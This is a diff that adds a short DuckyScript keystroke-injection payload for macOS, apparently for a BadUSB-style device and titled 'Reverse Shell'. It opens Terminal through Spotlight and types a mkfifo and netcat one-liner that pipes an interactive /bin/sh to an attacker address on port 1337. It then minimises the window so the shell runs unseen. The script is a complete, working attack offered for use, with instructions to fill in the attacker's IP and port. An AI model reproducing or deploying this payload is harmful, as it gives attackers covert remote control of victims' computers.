@@ -1,0 +1,19 @@
+META macos acceso
+REM Title: Reverse Shell
+REM Description: Opens a reverse shell from the target to the attacker
+REM Edit LHOST and LPORT on the STRING line below before using
+
+DEFAULTDELAY 500
+
+REM Open terminal:
+GUI SPACE
+STRING terminal
+ENTER
+DELAY 1000
+
+REM Edit the IP and port before using
+STRING rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.0.172 1337 > /tmp/f
+ENTER
+
+REM Minimise window to run stealthily
+GUI M
